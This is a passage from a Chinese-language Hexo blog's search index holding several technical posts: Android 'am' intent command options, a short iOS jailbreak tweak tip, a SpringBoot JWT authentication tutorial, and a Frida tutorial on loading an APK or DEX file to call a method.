</code>: 指定Intent data URI</li><li><code>-t </code>: 指定Intent MIME Type</li><li> <code>-c &lt;CATEGORY&gt; [-c &lt;CATEGORY&gt;] ...]:</code>:指定Intent category，实现原理Intent.addCategory()</li><li><code>-p </code>: 指定包名，实现原理Intent.setPackage();</li><li><code>-f </code>: 添加flags，实现原理Intent.setFlags(int )，紧接着的参数必须是int型；</li></ul><p>实例</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">am start -<span class="hljs-selector-tag">a</span> android<span class="hljs-selector-class">.intent</span><span class="hljs-selector-class">.action</span><span class="hljs-selector-class">.VIEW</span><br>am start -n com<span class="hljs-selector-class">.yuanhh</span>.app/<span class="hljs-selector-class">.MainActivity</span><br>am start -d <span class="hljs-attribute">content</span>://contacts/people/<span class="hljs-number">1</span><br>am start -t image/png<br>am start -c android<span class="hljs-selector-class">.intent</span><span class="hljs-selector-class">.category</span>.APP_CONTACTS<br></code></pre></td></tr></table></figure><h3 id="Extra参数"><a href="#Extra参数" class="headerlink" title="Extra参数"></a>Extra参数</h3><h4 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h4><table><thead><tr><th>参数</th><th>-e/-es</th><th>-esn</th><th>-ez</th><th>-ei</th><th>-el</th><th>-ef</th><th>-eu</th><th>-ecn</th></tr></thead><tbody><tr><td>类型</td><td>String</td><td>(String)null</td><td>boolean</td><td>int</td><td>long</td><td>float</td><td>uri</td><td>component</td></tr></tbody></table><p>比如参数es是Extra String首字母简称，实例：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">am</span> start -n <span class="hljs-keyword">com</span>.yuanhh.app/.MainActivity -es website gityuan.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><p>此处<code>-es website gityuan.com</code>，等价于Intent.putExtra(“website”, “gityuan.com”);</p><h4 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h4><table><thead><tr><th>参数</th><th>-esa</th><th>-eia</th><th>-ela</th><th>-efa</th></tr></thead><tbody><tr><td>数组类型</td><td>String[]</td><td>int[]</td><td>long[]</td><td>float[]</td></tr></tbody></table><p>比如参数eia，是Extra int array首字母简称，多个value值之间以逗号隔开.。</p><p>实例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">am</span> start -n com.yuanhh.app/.MainActivity -ela weekday <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>此处<code>-ela weekday 1,2,3,4,5</code>，等价于Intent.putExtra(“weekday”, new int[]{1,2,3,4,5});</p><h4 id="ArrayList类型"><a href="#ArrayList类型" class="headerlink" title="ArrayList类型"></a>ArrayList类型</h4><table><thead><tr><th>参数</th><th>-esal</th><th>-eial</th><th>-elal</th><th>-efal</th></tr></thead><tbody><tr><td>List类型</td><td>String</td><td>int</td><td>long</td><td>float</td></tr></tbody></table><p>比如参数efal，是Extra float Array List首字母简称，多个value值之间以逗号隔开。</p><p>实例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">am</span> start -n com.yuanhh.app/.MainActivity -efal nums <span class="hljs-number">1</span>.<span class="hljs-number">2</span>,<span class="hljs-number">2</span>.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>此处<code>-efal nums 1.2,2.2</code>，等价于先构造ArrayList变量，再通过putExtra放入第二个参数。</p><h3 id="Flags参数"><a href="#Flags参数" class="headerlink" title="Flags参数"></a>Flags参数</h3><p>在参数类型1中，提到有<code>-f </code>，是通过<code>Intent.setFlags(int )</code>方法，来设置Intent的flags.本小节也是关于flags，是通过<code>Intent.addFlags(int )</code>方法。如下所示，所有的flags参数。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json">[--grant-read-uri-permission] [--grant-write-uri-permission]<br>[--grant-persistable-uri-permission] [--grant-prefix-uri-permission]<br>[--debug-log-resolution]<br>[--exclude-stopped-packages] [--include-stopped-packages]<br>[--activity-brought-to-front] [--activity-clear-top]<br>[--activity-clear-when-task-reset] [--activity-exclude-from-recents]<br>[--activity-launched-from-history] [--activity-multiple-task]<br>[--activity-no-animation] [--activity-no-history]<br>[--activity-no-user-action] [--activity-previous-is-top]<br>[--activity-reorder-to-front] [--activity-reset-task-if-needed]<br>[--activity-single-top] [--activity-clear-task]<br>[--activity-task-on-home]<br>[--receiver-registered-only] [--receiver-replace-pending]<br></code></pre></td></tr></table></figure><p>例如，发送action=”broadcast.demo”的广播，并且对于forceStopPackage()的应用不允许接收该广播，命令如下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">am broadcast -<span class="hljs-keyword">a</span> broadcast.demo <span class="hljs-comment">--exclude-stopped-packages</span><br></code></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span>ea84febaa7bd<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>adb</tag>
      
      <tag>am</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IOS13.3.1 越狱后设置中未显示越狱插件</title>
    <link href="/2021/08/21/IOS13-3-1-%E8%B6%8A%E7%8B%B1%E5%90%8E%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%9C%AA%E6%98%BE%E7%A4%BA%E8%B6%8A%E7%8B%B1%E6%8F%92%E4%BB%B6/"/>
    <url>/2021/08/21/IOS13-3-1-%E8%B6%8A%E7%8B%B1%E5%90%8E%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%9C%AA%E6%98%BE%E7%A4%BA%E8%B6%8A%E7%8B%B1%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<ol><li>进入 cydia 重新安装 <code>cydia substrate</code>如果还未显示，重新安装 <code>Preference Loader</code></li></ol>]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>越狱</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot+JWT Token验证</title>
    <link href="/2021/08/21/SpringBoot-JWT-Token%E9%AA%8C%E8%AF%81/"/>
    <url>/2021/08/21/SpringBoot-JWT-Token%E9%AA%8C%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h2 id="1-pom-xml-添加依赖"><a href="#1-pom-xml-添加依赖" class="headerlink" title="1. pom.xml 添加依赖"></a>1. pom.xml 添加依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.auth0<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>java-jwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.8.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-application-yml"><a href="#2-application-yml" class="headerlink" title="2. application.yml"></a>2. application.yml</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">jwt:</span><br>  <span class="hljs-attr">expire:</span> <span class="hljs-number">86400000</span>      <span class="hljs-comment">#jwt有效时间(24小时)</span><br>  <span class="hljs-attr">secret:</span> <span class="hljs-string">secret</span>        <span class="hljs-comment"># 签名密钥</span><br></code></pre></td></tr></table></figure><h2 id="3-工具类生成、验证token、根据token提取用户ID"><a href="#3-工具类生成、验证token、根据token提取用户ID" class="headerlink" title="3. 工具类生成、验证token、根据token提取用户ID"></a>3. 工具类生成、验证token、根据token提取用户ID</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JwtUtil</span> </span>&#123;<br><br>    <span class="hljs-comment">//token有效时长</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">long</span> EXPIRE_TIME;<br>    <span class="hljs-comment">//密钥</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String SECRET;<br><br>    <span class="hljs-meta">@Value(&quot;$&#123;jwt.secret&#125;&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setSecret</span><span class="hljs-params">(String secret)</span> </span>&#123;<br>        JwtUtil.SECRET= secret;<br>    &#125;<br><br>    <span class="hljs-meta">@Value(&quot;$&#123;jwt.expire&#125;&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setExpireTime</span><span class="hljs-params">(<span class="hljs-keyword">long</span> date)</span> </span>&#123;<br>        JwtUtil.EXPIRE_TIME= date;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 生成签名，24小时后过期</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> userId</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">getToken</span><span class="hljs-params">(String userId)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Date date = <span class="hljs-keyword">new</span> Date(System.currentTimeMillis() + EXPIRE_TIME);<br>            Algorithm algorithm = Algorithm.HMAC256(SECRET);<br>            <span class="hljs-keyword">return</span> JWT.create()<br>                    <span class="hljs-comment">// 将 user id 保存到 token 里面</span><br>                    .withAudience(userId)<br>                    .withExpiresAt(date)<br>                    <span class="hljs-comment">// token 的密钥</span><br>                    .sign(algorithm);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 根据token获取userId</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> token</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">getUserName</span><span class="hljs-params">(String token)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            String userId = JWT.decode(token).getAudience().get(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">return</span> userId;<br>        &#125; <span class="hljs-keyword">catch</span> (JWTDecodeException e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 校验token</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> token</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DecodedJWT <span class="hljs-title">verify</span><span class="hljs-params">(String token)</span></span>&#123;<br>        JWTVerifier build = JWT.require(Algorithm.HMAC256(SECRET)).build();<br>        <span class="hljs-keyword">return</span> build.verify(token);  <br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-添加拦截器"><a href="#4-添加拦截器" class="headerlink" title="4. 添加拦截器"></a>4. 添加拦截器</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JwtInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HandlerInterceptor</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">preHandle</span><span class="hljs-params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object object)</span> </span>&#123;<br>        <span class="hljs-comment">//OPTIONS请求默认通过</span><br>        <span class="hljs-keyword">if</span> (httpServletRequest.getMethod().equals(<span class="hljs-string">&quot;OPTIONS&quot;</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>        <span class="hljs-comment">//获取请求头X-Token字段</span><br>        String token = httpServletRequest.getHeader(<span class="hljs-string">&quot;X-Token&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            JwtUtil.verify(token);<br>        &#125;<span class="hljs-keyword">catch</span> (SignatureVerificationException e)&#123;<br>            <span class="hljs-comment">//e.printStackTrace();</span><br>            System.out.println(<span class="hljs-string">&quot;无效签名&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<span class="hljs-keyword">catch</span> (TokenExpiredException e)&#123;<br>            <span class="hljs-comment">//e.printStackTrace();</span><br>            System.out.println(<span class="hljs-string">&quot;token过期&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<span class="hljs-keyword">catch</span> (AlgorithmMismatchException e)&#123;<br>            <span class="hljs-comment">//e.printStackTrace();</span><br>            System.out.println(<span class="hljs-string">&quot;token算法不一致&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            <span class="hljs-comment">//e.printStackTrace();</span><br>            System.out.println(<span class="hljs-string">&quot;token无效&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">postHandle</span><span class="hljs-params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterCompletion</span><span class="hljs-params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-配置拦截器"><a href="#5-配置拦截器" class="headerlink" title="5. 配置拦截器"></a>5. 配置拦截器</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InterceptorConfig</span>  <span class="hljs-keyword">implements</span> <span class="hljs-title">WebMvcConfigurer</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> </span>&#123;<br><br>        registry.addInterceptor(<span class="hljs-keyword">new</span> JwtInterceptor())<br>                <span class="hljs-comment">//拦截的路径</span><br>                .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)<br>                <span class="hljs-comment">//排除登录接口</span><br>                .excludePathPatterns(<span class="hljs-string">&quot;/prod-api/user/login&quot;</span>)<br>                .excludePathPatterns(<span class="hljs-string">&quot;/prod-api/user/logout&quot;</span>);<br>        WebMvcConfigurer.<span class="hljs-keyword">super</span>.addInterceptors(registry);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-controller层实现登录方法和获取用户信息"><a href="#6-controller层实现登录方法和获取用户信息" class="headerlink" title="6. controller层实现登录方法和获取用户信息"></a>6. controller层实现登录方法和获取用户信息</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/login&quot;,method = RequestMethod.POST)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;JSONObject&gt; <span class="hljs-title">login</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String userInfo)</span></span>&#123;<br>    JSONObject jsonObject = JSON.parseObject(userInfo);<br>    String username = (String) jsonObject.get(<span class="hljs-string">&quot;username&quot;</span>);  <span class="hljs-comment">//获取登录账号</span><br>    String password = (String) jsonObject.get(<span class="hljs-string">&quot;password&quot;</span>);  <span class="hljs-comment">//登录密码</span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 验证用户密码是否正确（此处省略）</span><br><span class="hljs-comment">     */</span>        <br><br>    JSONObject dataJson = <span class="hljs-keyword">new</span> JSONObject();<br>    dataJson.put(<span class="hljs-string">&quot;token&quot;</span>,JwtUtil.getToken(username));  <span class="hljs-comment">//将生成token发送至用户</span><br>    <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">&quot;登录成功&quot;</span>, dataJson);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-测试"><a href="#7-测试" class="headerlink" title="7. 测试"></a>7. 测试</h2><p>登录成功返回token</p> <img src="/2021/08/21/SpringBoot-JWT-Token%E9%AA%8C%E8%AF%81/images/login.png" class=""><p>更改请求x-token，被拦截器拦截返回错误信息</p> <img src="/2021/08/21/SpringBoot-JWT-Token%E9%AA%8C%E8%AF%81/images/token.png" class=""><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><a href="https://github.com/lingade/springboot-jwt">SpringBoot+JWT Token验证</a></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JWT</tag>
      
      <tag>java</tag>
      
      <tag>springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Frida加载APK/DEX文件并调用方法</title>
    <link href="/2021/08/21/Frida%E5%8A%A0%E8%BD%BDAPK-DEX%E6%96%87%E4%BB%B6%E5%B9%B6%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2021/08/21/Frida%E5%8A%A0%E8%BD%BDAPK-DEX%E6%96%87%E4%BB%B6%E5%B9%B6%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="1-AndroidStudio创建项目"><a href="#1-AndroidStudio创建项目" class="headerlink" title="1. AndroidStudio创建项目"></a>1. AndroidStudio创建项目</h2><p>创建returnNum方法</p> <img src="/2021/08/21/Frida%E5%8A%A0%E8%BD%BDAPK-DEX%E6%96%87%E4%BB%B6%E5%B9%B6%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/images/as.png" class=""><h2 id="2-build项目，将apk-push手机中"><a href="#2-build项目，将apk-push手机中" class="headerlink" title="2. build项目，将apk push手机中"></a>2. build项目，将apk push手机中</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb push 1.apk /data/local/tmp<br></code></pre></td></tr></table></figure><h2 id="3-Frida加载APK调用方法"><a href="#3-Frida加载APK调用方法" class="headerlink" title="3. Frida加载APK调用方法"></a>3. Frida加载APK调用方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> DEXFactory = <span class="hljs-literal">null</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadAPK</span>(<span class="hljs-params">path</span>)</span>&#123;<br>    <span class="hljs-keyword">var</span> ActivityThread = Java.use(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>);<br>    <span class="hljs-keyword">var</span> app = ActivityThread.currentApplication();<br>    Java.classFactory.cacheDir = <span class="hljs-string">&quot;/data/data/&quot;</span> + app.getPackageName() + <span class="hljs-string">&quot;/cache&quot;</span>;<br>    Java.classFactory.codeCacheDir = <span class="hljs-string">&quot;/data/data/&quot;</span> + app.getPackageName() + <span class="hljs-string">&quot;/code_cache&quot;</span>;<br>    <span class="hljs-keyword">var</span> DexClassLoader = Java.use(<span class="hljs-string">&quot;dalvik.system.DexClassLoader&quot;</span>);<br>    <span class="hljs-keyword">var</span> DEXCL = DexClassLoader.$new(path, Java.classFactory.codeCacheDir, <span class="hljs-literal">null</span>, DexClassLoader.getSystemClassLoader());<br>    DEXFactory = Java.ClassFactory.get(DEXCL);<br>    DEXFactory.cacheDir = <span class="hljs-string">&quot;/data/data/&quot;</span> + app.getPackageName() + <span class="hljs-string">&quot;/cache&quot;</span>;<br>    DEXFactory.codeCacheDir = <span class="hljs-string">&quot;/data/data/&quot;</span> + app.getPackageName() + <span class="hljs-string">&quot;/code_cache&quot;</span>;<br>&#125;<br><br><br>Java.performNow(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    loadAPK(<span class="hljs-string">&quot;/data/local/tmp/1.apk&quot;</span>);<br>    <span class="hljs-keyword">var</span> utils = DEXFactory.use(<span class="hljs-string">&quot;custom.dex.utils&quot;</span>);<br>    <span class="hljs-built_in">console</span>.log(utils.returnNum());<br><br>&#125;);<br></code></pre></td></tr></table></figure><p>加载APK并调用方法,此处方法只是简单的return 数字，也可以将一些复杂的逻辑放在APK中用于调用</p> <img src="/2021/08/21/Frida%E5%8A%A0%E8%BD%BDAPK-DEX%E6%96%87%E4%BB%B6%E5%B9%B6%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/images/frida.png" class=""><h2 id="4-Frida加载DEX调用方法"><a href="#4-Frida加载DEX调用方法" class="headerlink" title="4.Frida加载DEX调用方法"></a>4.Frida加载DEX调用方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">Java.openClassFile(<span class="hljs-string">&quot;/data/local/tmp/xxx.dex&quot;</span>).load();<br><span class="hljs-keyword">var</span>  utils = Java.use(<span class="hljs-string">&quot;custom.dex.utils&quot;</span>);<br><span class="hljs-built_in">console</span>.log(utils.returnNum());<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>frida</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>frida</tag>
      
      <tag>hook</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
